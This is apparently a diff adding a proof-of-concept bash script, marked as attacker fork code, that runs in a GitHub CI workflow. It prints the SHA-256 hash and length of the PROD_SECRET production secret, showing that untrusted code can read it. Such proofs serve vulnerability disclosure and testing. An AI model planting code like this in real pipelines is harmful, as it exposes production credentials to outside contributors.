@@ -1,0 +1,3 @@
+#!/bin/bash
+echo "S0X-ATTACKER-FORK-CODE-RAN sha=$GITHUB_SHA repo=$GITHUB_REPOSITORY"
+echo "S0X-SECRET-LEN=${#PROD_SECRET} S0X-SECRET-SHA256=$(printf %s "$PROD_SECRET" | sha256sum | cut -c1-64)"
